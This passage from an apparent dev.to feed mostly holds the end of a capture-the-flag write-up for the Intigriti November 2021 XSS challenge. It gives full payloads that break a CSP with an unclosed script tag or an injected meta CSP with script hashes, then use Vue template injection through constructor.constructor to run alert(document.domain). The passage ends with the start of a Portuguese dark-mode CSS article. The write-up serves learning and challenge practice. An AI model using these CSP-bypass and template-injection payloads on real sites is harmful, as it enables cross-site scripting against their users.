&lt;span class="nt"&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Okay, now we have a piece of code where &lt;code&gt;addJS&lt;/code&gt; is being called, but first of all, it will only be called if this &lt;code&gt;window.isProd&lt;/code&gt; is not true. This variable is being defined in a different and previous &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; tag, it's actually the first one before &lt;code&gt;./vuejs.php&lt;/code&gt; takes the first place. 😄&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight html"&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;title&amp;gt;&lt;/span&gt;You searched for 'OurPreviousPayloadHere'&lt;span class="nt"&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;script &lt;/span&gt;&lt;span class="na"&gt;nonce=&lt;/span&gt;&lt;span class="s"&gt;"r4nd0mn0nc3"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
      &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;isProd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;          &lt;span class="c1"&gt;// window.isProd being defined&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
        ...
    &lt;span class="nt"&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
    ...
&lt;span class="nt"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;We have to figure out a way of breaking it so it never gets this true value. Remember our payload, &lt;code&gt;&amp;lt;/title&amp;gt;&amp;lt;h1&amp;gt;example&amp;lt;/h1&amp;gt;&lt;/code&gt;? If we change it to &lt;code&gt;&amp;lt;/title&amp;gt;&amp;lt;script&amp;gt;&lt;/code&gt;, the browser will get "confused" because of the unclosed tag, and this new tag will be closed on the next &lt;code&gt;&amp;lt;/script&amp;gt;&lt;/code&gt; that it can find. Also, because of the CSP, nothing inside this &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; will be executed, including the definition of &lt;code&gt;window.isProd&lt;/code&gt;. It's worth mentioning that when it comes to JavaScript, the result of &lt;code&gt;if(undefinedVariable)&lt;/code&gt; is false, and &lt;code&gt;if(!undefinedVariable)&lt;/code&gt; is true, so having an undefined variable is enough, and we don't need it's value to equals false. 🤯&lt;/p&gt;

&lt;p&gt;Now let's get back to the code, but now inside the if condition. First of all, we have these new query parameters:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;version&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;URL&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;location&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;searchParams&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="kd"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;version&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="dl"&gt;''&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="nx"&gt;version&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;version&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;slice&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;vueDevtools&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;URL&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;location&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;searchParams&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="kd"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;vueDevtools&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="dl"&gt;''&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="nx"&gt;vueDevtools&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;vueDevtools&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sr"&gt;/&lt;/span&gt;&lt;span class="se"&gt;[^&lt;/span&gt;&lt;span class="sr"&gt;0-9%a-z&lt;/span&gt;&lt;span class="se"&gt;/&lt;/span&gt;&lt;span class="sr"&gt;.&lt;/span&gt;&lt;span class="se"&gt;]&lt;/span&gt;&lt;span class="sr"&gt;/gi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="dl"&gt;''&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sr"&gt;/^&lt;/span&gt;&lt;span class="se"&gt;\/\/&lt;/span&gt;&lt;span class="sr"&gt;+/&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="dl"&gt;''&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;code&gt;version&lt;/code&gt; contains only the first 12 characters of your input (if you insert something greater than this). &lt;code&gt;vueDevTools&lt;/code&gt; has a whitelist filter that only allows for &lt;code&gt;letters&lt;/code&gt;, &lt;code&gt;numbers&lt;/code&gt;, &lt;code&gt;%&lt;/code&gt; and &lt;code&gt;.&lt;/code&gt;. It will also replace any starting &lt;code&gt;//&lt;/code&gt; (one or more cases) to an empty string.&lt;/p&gt;

&lt;p&gt;Continuing the code, we have:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;version&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="mi"&gt;999999999999&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
  &lt;span class="nx"&gt;setTimeout&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;window&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;legacyLogger&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;version&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;1000000000000&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;  &lt;span class="c1"&gt;// Wait, it has 13 characters! &amp;gt;:(&lt;/span&gt;
  &lt;span class="nx"&gt;addJS&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;vueDevtools&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;window&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;initVUE&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;performance&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;In order to be able to call &lt;code&gt;addJS&lt;/code&gt; we will need to define a value for the &lt;code&gt;version&lt;/code&gt; parameter which is greater than 1000000000000. As &lt;code&gt;version&lt;/code&gt; max characters length is 12, it will not be possible by using a simple decimal value.&lt;/p&gt;

&lt;p&gt;But this common way we always take is not the only way of &lt;a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Number#convert_numeric_strings_and_null_to_numbers"&gt;representing a number in JavaScript&lt;/a&gt;, and the same thing applies to most programming languages. We may, for example, try values like &lt;code&gt;0xffffffffff&lt;/code&gt; (1099511627775 in hexadecimal) or &lt;code&gt;1e15&lt;/code&gt; (1 times 10 raised to the 15th power). I am going to stick with the hexadecimal approach because it's the one I originally found, so now our payload would be something like &lt;code&gt;?s=&amp;lt;/title&amp;gt;&amp;lt;script&amp;gt;&amp;amp;version=0xffffffffff&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;For the value of &lt;code&gt;vueDevtools&lt;/code&gt;, we can see that it will be used as a source on &lt;code&gt;addJS&lt;/code&gt;, because it's the first parameter of the function. If we simply try to point out to any complete URL, it will not work because the filter for &lt;code&gt;vueDevTools&lt;/code&gt; doesn't allow the use of the &lt;code&gt;:&lt;/code&gt; character, in a way that a URL like &lt;code&gt;http://example.com/xss.js&lt;/code&gt; would always become &lt;code&gt;http//example.com/xss.js&lt;/code&gt;. It means that we are limited to include only files that are inside of the application environment.&lt;/p&gt;

&lt;p&gt;This limitation doesn't actually make any progress impossible because we can, for example, define &lt;code&gt;vueDevtools=./vuejs.php&lt;/code&gt;. This redundancy would create a new instance of Vue after the first one, and by knowing that Vue.js parses any &lt;code&gt;v-{{ }}&lt;/code&gt; that it finds in the DOM, if we add a test to our &lt;code&gt;s&lt;/code&gt; parameter like &lt;code&gt;&amp;lt;/title&amp;gt;&amp;lt;script&amp;gt;v-{{7*7}}&lt;/code&gt;, we are going to see that it parses the &lt;code&gt;v-{{7*7}}&lt;/code&gt; and shows &lt;code&gt;49&lt;/code&gt; on the screen. CSTI, yay! 🥳&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--uWElka-7--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/3eptiw2wy4ueqv4pd9xz.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--uWElka-7--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/3eptiw2wy4ueqv4pd9xz.png" alt="Vue parsing our payload as it was part of a template" width="774" height="189"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#checkeredflag-csti-leads-to-reflected-crosssite-scripting"&gt;
  &lt;/a&gt;
  🏁 CSTI Leads to Reflected Cross-Site Scripting
&lt;/h3&gt;

&lt;p&gt;Okay, we have this payload, which is &lt;code&gt;?s=&amp;lt;/title&amp;gt;&amp;lt;script&amp;gt;v-{{7*7}}&amp;amp;version=0xffffffffff&amp;amp;vueDevtools=./vuejs.php&lt;/code&gt;, and it's capable of trigger a Client-Side Template Injection, but how do we use it in order to execute arbitrary JavaScript code?&lt;/p&gt;

&lt;p&gt;Searching a little bit more about CSTI, I found out that that's possible to define functions and instantly execute them, all inside a template. It uses the JavaScript &lt;code&gt;constructor&lt;/code&gt; function and it would be like this:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;{{ constructor.constructor("YOUR_JAVASCRIPT_CODE_HERE")() }}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;From this, we have our final payload, which is &lt;a href="https://challenge-1121.intigriti.io/challenge/index.php?s=%3C%2Ftitle%3E%3Cscript%3Ev-%7B%7Bconstructor.constructor%28%22alert%28document.domain%29%22%29%28%29%7D%7D&amp;amp;version=0xffffffffff&amp;amp;vueDevtools=./vuejs.php"&gt;https://challenge-1121.intigriti.io/challenge/index.php?s=%3C%2Ftitle%3E%3Cscript%3Ev-%7B%7Bconstructor.constructor%28%22alert%28document.domain%29%22%29%28%29%7D%7D&amp;amp;version=0xffffffffff&amp;amp;vueDevtools=./vuejs.php&lt;/a&gt; (URL encoded).&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#flushed-the-intended-solution"&gt;
  &lt;/a&gt;
  😳 The Intended Solution
&lt;/h2&gt;

&lt;p&gt;For this part, I have to say thank you to Ivars Vids, who tried during the entire week to make me think in different ways without giving the challenge away. Thank you for your efforts into making me less stupid 🤗😂&lt;/p&gt;

&lt;p&gt;I was told that the difference between my solution and the intended one is the first step, because no &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; tag is supposed to be broken by adding new &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; tags. And I was also told that the &lt;a href="https://twitter.com/intigriti/status/1460281663301246985"&gt;first hint&lt;/a&gt; was all about this first step.&lt;/p&gt;

&lt;p&gt;Considering that we have an enemy, and we have to make it stronger, I remember that the CSP was the first issue we found during the unintended solution. So what if we use it in order to block the scripts we don't want to be executed? 🤔&lt;/p&gt;

&lt;p&gt;Remember that originally, the CSP is given to our browser through the response headers, but it also may be defined by using a &lt;code&gt;&amp;lt;meta&amp;gt;&lt;/code&gt; tag. There's an example down below:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;&amp;lt;meta http-equiv="Content-Security-Policy" content="script-src 'none'"&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#bulb-an-insight"&gt;
  &lt;/a&gt;
  💡 An Insight
&lt;/h3&gt;

&lt;p&gt;If we add this CSP definition after a &lt;code&gt;&amp;lt;/title&amp;gt;&lt;/code&gt; tag to the &lt;code&gt;s&lt;/code&gt; query parameter, we will have as a result that every single script tag will be blocked, and no script in the page will be executed.&lt;/p&gt;

&lt;p&gt;Do you remember these tags?&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight html"&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;script &lt;/span&gt;&lt;span class="na"&gt;nonce=&lt;/span&gt;&lt;span class="s"&gt;"r4nd0mn0nc3"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt; &lt;span class="c1"&gt;// Script #1&lt;/span&gt;
  &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;isProd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;script &lt;/span&gt;&lt;span class="na"&gt;nonce=&lt;/span&gt;&lt;span class="s"&gt;"r4nd0mn0nc3"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt; &lt;span class="c1"&gt;// Script #2&lt;/span&gt;
  &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;addJS&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;src&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;cb&lt;/span&gt;&lt;span class="p"&gt;){...}&lt;/span&gt;
  &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;initVUE&lt;/span&gt;&lt;span class="p"&gt;(){...}&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;script &lt;/span&gt;&lt;span class="na"&gt;nonce=&lt;/span&gt;&lt;span class="s"&gt;"r4nd0mn0nc3"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt; &lt;span class="c1"&gt;// Script #3&lt;/span&gt;
  &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;delimiters&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;v-{{&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;}}&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
  &lt;span class="nx"&gt;addJS&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;./vuejs.php&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;initVUE&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;script &lt;/span&gt;&lt;span class="na"&gt;nonce=&lt;/span&gt;&lt;span class="s"&gt;"r4nd0mn0nc3"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt; &lt;span class="c1"&gt;// Script #4&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nb"&gt;window&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;isProd&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
    &lt;span class="p"&gt;...&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;I thought it would be a nice idea to block scripts &lt;code&gt;#1&lt;/code&gt; and &lt;code&gt;#3&lt;/code&gt; instead of just the first one, because by doing it, we wouldn't need to use these custom delimiters on the payload anymore. Okay, but how exactly do we allow only specific script tags?&lt;/p&gt;

&lt;p&gt;This question got me stuck for the entire week, but when I had only a few hours left, I got an interesting insight. The Content Security Policy also allows us to define hashes for the scripts to be verified before executing, so I could add the hashes for scripts &lt;code&gt;#2&lt;/code&gt; and &lt;code&gt;#4&lt;/code&gt;, and define nothing for &lt;code&gt;#1&lt;/code&gt; and &lt;code&gt;#3&lt;/code&gt; so they are blocked by the CSP itself.&lt;/p&gt;

&lt;p&gt;Taking a look at the dev tools console, with our current payload &lt;code&gt;?s=&amp;lt;/title&amp;gt;&amp;lt;meta http-equiv="Content-Security-Policy" content="script-src 'none'"&amp;gt;&lt;/code&gt;, we are going to see these error messages:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--zB97bcST--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/hk6qkjp0v992zjmok4tx.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--zB97bcST--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/hk6qkjp0v992zjmok4tx.png" alt="Four blocked scripts, and their respectives hashes displayed" width="880" height="104"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Four error messages, each one representing one of our &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; tags being blocked by the CSP. Notice that for each one, there's a hash that corresponds to the content inside of the tag.&lt;/p&gt;

&lt;p&gt;Picking up the hashes of &lt;code&gt;#2&lt;/code&gt; and &lt;code&gt;#4&lt;/code&gt;, and adding them to the CSP &lt;code&gt;&amp;lt;meta&amp;gt;&lt;/code&gt; tag along with the same &lt;code&gt;unsafe-eval&lt;/code&gt; and &lt;code&gt;strict-dynamic&lt;/code&gt; used by the original CSP, we will have the following payload which blocks &lt;code&gt;#1&lt;/code&gt; and &lt;code&gt;#3&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;?s=&amp;lt;/title&amp;gt;&amp;lt;meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-eval' 'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2Boz%2BCtD7RE4=' 'sha256-Tz/iYFTnNe0de6izIdG%2Bo6Xitl18uZfQWapSbxHE6Ic=' 'strict-dynamic'"&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--L-_pY7tu--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/y0knctjqd8zyayeocp2v.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--L-_pY7tu--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/y0knctjqd8zyayeocp2v.png" alt="Content Security Policy defined in order to block first and third script tags" width="750" height="130"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Now, we add our previous values for &lt;code&gt;version&lt;/code&gt; and &lt;code&gt;vueDevtools&lt;/code&gt;, which are going to work the same:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;?s=&amp;lt;/title&amp;gt;&amp;lt;meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-eval' 'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2Boz%2BCtD7RE4=' 'sha256-Tz/iYFTnNe0de6izIdG%2Bo6Xitl18uZfQWapSbxHE6Ic=' 'strict-dynamic'"&amp;gt;&amp;amp;version=0xffffffffff&amp;amp;vueDevtools=./vuejs.php&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;This will make a new instance of Vue.js be started without any custom delimiters. Once it's done, we have to inject our XSS template inside &lt;code&gt;&amp;lt;div id="app"&amp;gt;&amp;lt;/div&amp;gt;&lt;/code&gt;, which is already in the page and it's used by Vue as the container for its job. But what if we just add it again in our payload as this one down below?&lt;/p&gt;

&lt;p&gt;&lt;code&gt;&amp;lt;div id="app"&amp;gt;{{constructor.constructor('alert(document.domain)')()}}&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;It works! 🥳&lt;/p&gt;

&lt;p&gt;&lt;a href="https://challenge-1121.intigriti.io/challenge/index.php?s=%3C/title%3E%3Cmeta%20http-equiv=%22Content-Security-Policy%22%20content=%22script-src%20%27unsafe-eval%27%20%27sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2Boz%2BCtD7RE4=%27%20%27sha256-Tz/iYFTnNe0de6izIdG%2Bo6Xitl18uZfQWapSbxHE6Ic=%27%20%27strict-dynamic%27%22%3E%3Cdiv%20id=%22app%22%3E%7B%7Bconstructor.constructor(%27alert(document.domain)%27)()%7D%7D%3C/div%3E&amp;amp;version=0xffffffffff&amp;amp;vueDevtools=./vuejs.php"&gt;https://challenge-1121.intigriti.io/challenge/index.php?s=%3C/title%3E%3Cmeta%20http-equiv=%22Content-Security-Policy%22%20content=%22script-src%20%27unsafe-eval%27%20%27sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2Boz%2BCtD7RE4=%27%20%27sha256-Tz/iYFTnNe0de6izIdG%2Bo6Xitl18uZfQWapSbxHE6Ic=%27%20%27strict-dynamic%27%22%3E%3Cdiv%20id=%22app%22%3E%7B%7Bconstructor.constructor(%27alert(document.domain)%27)()%7D%7D%3C/div%3E&amp;amp;version=0xffffffffff&amp;amp;vueDevtools=./vuejs.php&lt;/a&gt; (URL encoded)&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#thank-you-for-taking-your-time-hugs"&gt;
  &lt;/a&gt;
  Thank you for taking your time! 🤗
&lt;/h3&gt;

</description>
      <category>security</category>
      <category>bugbounty</category>
      <category>javascript</category>
      <category>vue</category>
    </item>
    <item>
      <title>Levando DarkMode ao seu site</title>
      <author>Caio Gomes</author>
      <pubDate>Sun, 21 Nov 2021 23:36:42 +0000</pubDate>
      <link>https://dev.to/caioc/levando-darkmode-ao-seu-site-2ie7</link>
      <guid>https://dev.to/caioc/levando-darkmode-ao-seu-site-2ie7</guid>
      <description>&lt;p&gt;Com as últimas atualizações dos sistemas operacionais mobile (iOS e Android), o Dark Mode (Modo Escuro), tem virado tendência tanto quanto nos sistemas operacionais, quando em aplicativos e sites e, com essa tendência crescente, você também pode querer adaptar o seu site para o dark mode de acordo com a escolha da máquina (ou dispositivo móvel) do usuário.&lt;/p&gt;

&lt;p&gt;Para isso, podemos seguir por duas principais abordagens, via CSS ou via JavaScript, e neste artigo irei mostrar como fazer e você irá a escolher a opção que ficará melhor em sua aplicação ou site.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#css"&gt;
  &lt;/a&gt;
  CSS
&lt;/h2&gt;

&lt;p&gt;Seguindo esta abordagem iremos usar o prefers-color-scheme media query, que, atualmente tem sua compatibilidade nos principais navegadores (desktop e mobile), fazendo com seja muito simples sua aplicação e que alcance cerca de 77% dos potenciais usuários, como é possível ver na imagem abaixo:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--zkwmXqMR--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/faj7d1fyngdy0aludr86.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--zkwmXqMR--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/faj7d1fyngdy0aludr86.png" alt="Can I Use" width="880" height="271"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Abaixo está um exemplo bem simples de como é a escrita do código, neste exemplo considerado que o seu site seja feito na versão light e passe a ter suporte ao dark mode:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight css"&gt;&lt;code&gt;&lt;span class="nt"&gt;body&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
 &lt;span class="nl"&gt;background&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;#FFF&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 &lt;span class="nl"&gt;color&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;#000&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="k"&gt;@media&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;prefers-color-scheme&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;dark&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nt"&gt;body&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nl"&gt;background&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;#000&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;color&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;#FFF&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;O inverso também é possível, caso você construa a versão do seu site/aplicação em escuro e queira oferecer uma versão light, o código fica assim:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
